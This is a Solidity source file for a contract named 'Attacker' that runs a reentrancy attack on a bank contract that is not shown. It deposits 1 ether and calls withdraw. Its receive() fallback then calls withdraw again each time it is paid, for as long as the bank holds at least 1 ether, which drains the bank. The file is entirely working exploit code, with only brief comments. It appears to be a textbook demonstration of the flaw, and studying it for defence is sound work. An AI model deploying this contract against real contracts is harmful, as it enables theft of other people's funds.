// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerableBank public bank;

    constructor(address _bank) {
        bank = IVulnerableBank(_bank);
    }

    // Fallback is triggered when the bank sends Ether
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();  // Recursive call
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        bank.deposit{value: 1 ether}();
        bank.withdraw();  // Initial call
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}